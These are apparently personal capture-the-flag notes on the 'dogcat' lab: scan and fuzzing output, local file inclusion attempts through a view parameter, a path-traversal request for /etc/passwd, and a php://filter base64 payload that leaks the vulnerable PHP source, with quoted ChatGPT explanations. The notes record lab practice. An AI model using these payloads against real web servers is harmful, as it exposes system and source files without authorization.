root@ip-10-201-22-247:~# nmap -Pn -T4 -A -p- 10.201.16.99 -oN initial.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-29 02:34 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.16.99
Host is up (0.00025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
MAC Address: 16:FF:CA:3F:E5:59 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/29%OT=22%CT=1%CU=38715%PV=Y%DS=1%DC=D%G=Y%M=16FFCA%
OS:TM=69017D50%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 10.201.16.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
root@ip-10-201-22-247:~# gobuster dir -u http://10.201.16.99 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt, .html, .yaml, .json, .php, .php4, .php5
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.16.99
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 418]
/cats                 (Status: 301) [Size: 311] [--> http://10.201.16.99/cats/]
/dogs                 (Status: 301) [Size: 311] [--> http://10.201.16.99/dogs/]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished

Seems pretty normal let's run the subdirectories for funsies

direcrory list med found nothing in subdirectories oh well let's go inspect them manually

![[Pasted image 20251028225825.png]]

The description for this room is LFI so I guess we'll let 'er rip. Disappointedthe 403 has no tech stack enu but whatever.

root@ip-10-201-22-247:~# ffuf -u http://10.201.16.99/cats/FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 2287

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.16.99/cats/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

../.htpasswd            [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
/.htpasswd              [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [914/914] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 3 ::

pretty interesting output but they're just 403s so I may need to doctor the list a bit. Definitely need to keep enumerating here.

Well i am dumb I played with the site a bit and it does this: http://10.201.16.99/?view=cat

so let's play with the view param a bit

http://10.201.51.7/?view=dog../../../../../etc/passwd

gets us

Here you go!
Warning: include(dog../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24

so it appended .php extension to my passwd so it cant actually show it > : (

google says:

A website configured to automatically add the `.php` extension to URLs typically employs server-side rewrite rules, most commonly using Apache's `mod_rewrite` module via an `.htaccess` file. This is done to achieve cleaner, more user-friendly URLs while still serving the underlying PHP files.

Here's how this is generally implemented:

- **Enabling Rewrite Engine:** The `.htaccess` file begins by enabling the Apache rewrite engine.
which is extremely reminiscent of the .htpassword that was 403ing earlier.... 

says modrewrite can be configured as such

AllowOverride All
 
RewriteEngine On
RewriteRule ^([^\.]+)$ $1.php [NC,L]

I was thinking about it in the car to add null byte to rip off anything added but that failed. Maybe it is past PHP 5.3

![[Pasted image 20251029233226.png]]

At this point I was stuck so I read through a walkthrough that pointed me to this write up on a php wrapper technique allowing for base64 encoding of the

### Typical use and abuse patterns (conceptual)

- **Source disclosure**: Attackers combine a local-file-inclusion (LFI) bug with `php://filter/read=convert.base64-encode/resource=...` to make the application output a Base64-encoded copy of a file (so they can decode it client-side and read source). That works because the wrapper returns bytes that can be printed back to the browser.
this is ChatGPT's explanation 

http://10.201.51.7/?view=dogphp://filter/read=convert.base64-encode/resource=/var/www/html/index.php
didn't work so got stumped again
Warning: include(php://filter/read=convert.base64-encode/resource=dog/../index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 24

oh double extensions

http://10.201.51.7/?view=php://filter/read=convert.base64-encode/resource=dog/../var/www/html/index.php

URI when fixed to not have extra .php spits out this in base64 encoded form 

<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

so we can set the $ext variable that gets set after the . is appended ourselves?

###### ChatGPT said:

Excellent catch — yes, **you can set `$ext` yourself**, because of this line:

`$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';`

